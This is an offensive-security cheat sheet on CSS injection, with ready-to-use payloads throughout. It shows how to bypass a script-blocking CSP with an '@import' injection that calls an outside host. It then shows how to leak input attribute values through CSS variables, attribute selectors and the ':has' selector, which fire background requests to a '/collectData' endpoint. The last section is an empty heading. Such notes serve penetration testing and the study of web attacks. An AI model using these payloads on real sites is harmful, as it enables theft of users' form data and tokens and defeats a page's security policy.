----------------

## CSS Injection

----------------

- THis method is used in a situation where CSP blocks inline javascript and only style tags are allowed.Test it by using an import rule to Burp collaboarator.

```
"><style>@import'//host.com'</style>
```

- Triggering requests with CSS variables
  -  Use css variables as a on/off switch that triggers a conditional request  with background images. As long as your variable is defined with a url() and a fallback that is a valid CSS property value (i.e. "none" for a background image) then you can use this variable to trigger a request by setting the variable:

```html
<input value=1337>
<style>
input[value="1337"] {
   --value: url(/collectData?value=1337);
}
input {
   background:var(--value,none);
}
</style>
```

- Extracting data with CSS(Using attribute selectors):Attribute selectors are an extremely powerful way to extract data. You can use them to check if attributes begin, end or even contain certain characters. Regex usage(Ends with 'a')-:
  
```css
input[value$="a"] {
   --value: url(/collectData?value=1337)
}
input {
   background:var(--value,none);
}
```

- Starts with-:

```css
input[value^="z"]{
    color: red;
}
```

- We need to combine attribute selectors with background images and  css variables to exfiltrate data.A variable is defined with the fallback set to none.

```css
input[value$=a] {
 --start-with-a: url(/collectData?data=a);
}
input {
  background:var(--start-with-a,none);
}

```
----------------

### Abusing the has selector to exfiltrate the child nodes

-----------------

- You can combine attribute selectors with the :has selector. This enables you to make a background request even if the element in question doesn't allow it such as a hidden input.The advantage of the :has selector is that removes the need for this and, in addition, because you don't need to know what element appears next, you can more easily exfiltrate unknown page structures:

```css
div:has(input[value="1337"]) {
  background:url(/collectData?value=1337);
}
```

----------------

### :has selector

-----------------

- 

----------------
